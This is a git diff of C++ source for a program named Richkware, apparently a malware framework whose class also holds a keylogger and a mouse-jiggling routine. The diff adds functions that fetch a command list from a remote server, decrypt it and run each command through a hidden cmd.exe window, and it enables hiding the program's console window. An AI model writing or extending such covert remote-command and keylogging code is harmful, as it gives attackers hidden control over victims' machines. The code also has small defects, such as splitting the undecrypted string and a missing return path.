@@ -91,15 +91,24 @@ void Richkware::RandMouse() {
     SetCursorPos((rand() % horizontal + 1), (rand() % vertical + 1));
 }
 
-void Richkware::executeCommands() {
-    std::string commands = systemStorage.LoadValueFromFile("commands.richk");
+std::vector<std::string> Richkware::updateCommands(const char *serverAddress, const char *port, const char *associatedUser, std::string remainingCommands) {
+    //TODO: encrypt command list before sending it to server
+    std::string commands = network.fetchCommand(serverAddress, port, associatedUser, remainingCommands);
     //decrypt string
     Crypto crypto(encryptionKey);
-    std::string decryptedCommands = crypto.Decrypt(commands);
-    std::vector<std::string> commandList = utils::split(commands, "##");
-    for (size_t i = 0; i < commandList.size(); ++i) {
-        ShellExecute(0, "open", "cmd.exe", "start", 0, SW_HIDE);
+    if (!commands.empty()) {
+        std::string decryptedCommands = crypto.Decrypt(commands);
+        std::vector<std::string> commandList = utils::split(commands, "##");
+//        for (size_t i = 0; i < commandList.size(); ++i) {
+//        }
+        return commandList;
     }
+}
+
+std::string Richkware::executeCommand(std::string command) {
+    std::string formattedCommand = "/C " + command;
+    ShellExecute(NULL, "open", "cmd.exe", formattedCommand.c_str(), NULL, SW_HIDE);    //start is a placeholder for the commands
+    return "";
 }
 
 void Richkware::Keylogger(const char *fileName) {
@@ -149,7 +158,7 @@ Richkware::Richkware(const char *AppNameArg, std::string EncryptionKeyArg) {
 Richkware::Richkware(const char *AppNameArg, std::string defaultEncryptionKey, const char *serverAddress,
                      const char *port, const char *associatedUser) {
     appName = AppNameArg;
-    //ShowWindow(GetConsoleWindow(), 0);
+    ShowWindow(GetConsoleWindow(), 0);
     systemStorage = SystemStorage(AppNameArg);
 
     // **encryptionKey**: check presence of encryption key in the system
